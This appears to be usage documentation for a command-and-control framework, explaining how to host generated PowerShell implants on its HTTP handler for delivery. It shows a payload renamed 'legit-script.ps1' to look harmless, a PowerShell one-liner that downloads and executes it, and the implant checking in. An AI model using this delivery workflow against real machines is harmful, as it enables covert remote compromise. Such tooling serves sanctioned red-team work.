# Hosting Files

You can host arbitrary files on the default HTTP Handler, useful as a quick payload delivery method.

```{admonition} Note
:class: information

There is no automatic link between payload generation and hosting files, so you must generate and download a payload first and then upload it to the Handler.
```

## Adding

You may host any file from your own filesystem, by providing its path and the filename you want to host it with.

```text
[drones] # payloads

[payloads] # set handler default-http
[payloads] # set format PowerShell
[payloads] # generate C:\Temp\drone.ps1
[+] Saved 265692 bytes.

[payloads] # back
[drones] # hosted-files

[hosted-files] # help add
Add a hosted file
Usage: add </path/to/file> <filename>

[hosted-files] # add C:\Temp\drone.ps1 legit-script.ps1
[+] legit-script.ps1 uploaded.
```

```{admonition} Note
:class: information

Adding a hosted file will automatically start the Handler if it's not already.
```

## Listing

Listing the hosted files will show you their filename and size in bytes.

```text
[hosted-files] # list

Filename          Size
--------          ----
legit-script.ps1  265692
```

```text
PS C:\> iex (new-object net.webclient).downloadstring("http://localhost/legit-script.ps1")
```

```text
[drones] #
[+] Drone 0a14d78ee2 checked in.

[drones] # list

Guid        Address       Hostname      Username  Process    PID    Integrity  Arch  LastSeen
----        -------       --------      --------  -------    ---    ---------  ----  --------
0a14d78ee2  172.29.128.1  Ghost-Canyon  Daniel    powershell 14260  Medium     x64   0.51s
```

## Deleting

A hosted file may be removed by its filename.

```text
[hosted-files] # help delete
Remove a hosted file
Usage: delete <filename>

[hosted-files] # delete legit-script.ps1
[+] legit-script.ps1 deleted.

[hosted-files] # list
[hosted-files] #
```